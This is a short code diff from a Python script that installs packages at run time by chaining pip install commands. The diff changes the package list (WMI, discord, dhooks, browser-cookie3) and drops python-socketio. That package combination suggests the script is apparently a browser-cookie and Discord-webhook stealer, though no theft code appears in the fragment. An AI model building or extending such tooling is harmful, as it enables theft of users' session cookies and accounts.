@@ -45,8 +45,7 @@ except Exception:
         "WMI",
         "discord",
         "dhooks",
-        "browser_cookie3",
-        "python-socketio",
+        "browser-cookie3",
     ]
     command = " ".join([
         f"python -m pip install {requirement} &&"
